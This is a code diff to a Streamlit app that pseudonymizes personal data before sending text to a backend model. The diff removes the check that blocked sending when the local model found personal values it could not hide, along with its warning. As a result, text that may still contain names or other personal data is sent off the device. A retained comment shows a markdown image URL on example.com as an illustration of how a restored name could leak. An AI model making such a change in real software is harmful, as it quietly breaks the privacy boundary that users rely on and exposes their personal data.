@@ -54,7 +54,7 @@ if st.button("Pseudonymize and answer", type="primary"):
     try:
         start = perf_counter()
         with st.spinner("Looking for personal data..."):
-            texts, mapping, missed = pseudonymize([text for _, text in named_texts])
+            texts, mapping = pseudonymize([text for _, text in named_texts])
         pseudonymized = perf_counter()
     except Exception as error:  # the model's libraries raise their own errors
         # Regex results alone would look complete, so nothing is shown and nothing is sent.
@@ -64,21 +64,18 @@ if st.button("Pseudonymize and answer", type="primary"):
         )
         st.stop()
 
-    restored, unknown = None, []
-    # A value that the model found but could not place may still be readable in the texts.
-    if not missed:
-        try:
-            with st.spinner("Waiting for the response..."):
-                # Only the texts: a file name can contain personal data too.
-                response = ask_backend("\n\n".join(texts))
-        except OSError as error:
-            st.error(
-                f"The backend could not answer: {error}\n\n"
-                "Check that it is running (`uv run python -m pii_anonymizer.backend`) and that "
-                "PII_BACKEND_TOKEN is the same on both sides."
-            )
-            st.stop()
-        restored, unknown = restore(response, mapping, texts)
+    try:
+        with st.spinner("Waiting for the response..."):
+            # Only the texts: a file name can contain personal data too.
+            response = ask_backend("\n\n".join(texts))
+    except OSError as error:
+        st.error(
+            f"The backend could not answer: {error}\n\n"
+            "Check that it is running (`uv run python -m pii_anonymizer.backend`) and that "
+            "PII_BACKEND_TOKEN is the same on both sides."
+        )
+        st.stop()
+    restored, unknown = restore(response, mapping, texts)
 
     # Clicking a star reruns this page, so the result must outlive the click on the button.
     st.session_state["result"] = {
@@ -86,7 +83,6 @@ if st.button("Pseudonymize and answer", type="primary"):
         "names": [name for name, _ in named_texts],
         "texts": texts,
         "mapping": mapping,
-        "missed": missed,
         "response": restored,
         "unknown": unknown,
         "pseudonymization_seconds": pseudonymized - start,
@@ -96,35 +92,25 @@ if st.button("Pseudonymize and answer", type="primary"):
 if result := st.session_state.get("result"):
     st.subheader("Pseudonymized content")
     st.caption("Privacy boundary: only this content may leave the device.")
-    if result["missed"]:
-        # The values go in st.code: st.warning renders Markdown, and a value comes from a model.
-        st.warning(
-            f"{len(result['missed'])} of the values found by the local model are not in the "
-            "content as it wrote them, so they could not be hidden and nothing was sent. "
-            "Rewrite or remove them, then try again."
-        )
-        st.code("\n".join(result["missed"]), language=None, wrap_lines=True)
     for name, text in zip(result["names"], result["texts"], strict=True):
         st.text(name)
         st.code(text, language=None, wrap_lines=True)
 
-    if result["response"] is not None:
-        st.subheader("Response")
-        st.caption(
-            f"Response time: {result['response_seconds']:.1f} s. "
-            f"Pseudonymization: {result['pseudonymization_seconds']:.1f} s."
+    st.subheader("Response")
+    st.caption(
+        f"Response time: {result['response_seconds']:.1f} s. "
+        f"Pseudonymization: {result['pseudonymization_seconds']:.1f} s."
+    )
+    if result["unknown"]:
+        st.warning(
+            "The response contains placeholders that were never sent or that the model "
+            "changed. "
+            "They are shown as they are: " + ", ".join(f"`{token}`" for token in result["unknown"])
         )
-        if result["unknown"]:
-            st.warning(
-                "The response contains placeholders that were never sent or that the model "
-                "changed. "
-                "They are shown as they are: "
-                + ", ".join(f"`{token}`" for token in result["unknown"])
-            )
-        # Plain text: Markdown loads images by itself, so a response that ends with
-        # ![](https://example.com/x.png?q=<PERSON_1>) would send the restored name without a click.
-        st.code(result["response"], language=None, wrap_lines=True)
-        st.feedback("stars", key=result["id"], on_change=rate, args=(result,))
+    # Plain text: Markdown loads images by itself, so a response that ends with
+    # ![](https://example.com/x.png?q=<PERSON_1>) would send the restored name without a click.
+    st.code(result["response"], language=None, wrap_lines=True)
+    st.feedback("stars", key=result["id"], on_change=rate, args=(result,))
 
     st.subheader("Mapping table")
     st.caption("Stays on this device.")
